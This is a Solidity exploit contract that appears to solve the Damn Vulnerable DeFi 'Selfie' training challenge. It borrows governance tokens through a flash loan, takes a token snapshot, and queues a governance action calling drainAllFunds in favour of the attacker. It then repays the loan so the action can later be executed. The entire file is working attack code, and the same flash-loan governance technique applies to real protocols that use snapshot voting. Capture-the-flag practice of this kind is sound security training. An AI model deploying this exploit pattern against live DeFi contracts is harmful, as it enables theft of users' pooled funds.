// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract HackSelfiePool {
  DamnValuableTokenSnapshot token;
  SimpleGovernance governance;
  SelfiePool pool;
  address attacker;

  uint actionId;

  constructor(address _tokenAddr, address _governance, address _selfiePool, address _attacker) {
    token = DamnValuableTokenSnapshot(_tokenAddr);
    governance = SimpleGovernance(_governance);
    pool = SelfiePool(_selfiePool);
    attacker = _attacker;
  }

  function flashLoan(uint _amount) external {
    pool.flashLoan(_amount);
  }

  fallback() external {
   uint amount;

   assembly {
    amount := calldataload(add(4,32))
   }
   token.snapshot();
   actionId = governance.queueAction(address(pool), abi.encodeWithSignature("drainAllFunds(address)", attacker), 0);

   token.transfer(address(pool), amount);
  }

  function drainAllFunds() external payable {
   governance.executeAction{value: msg.value}(actionId);
  }
}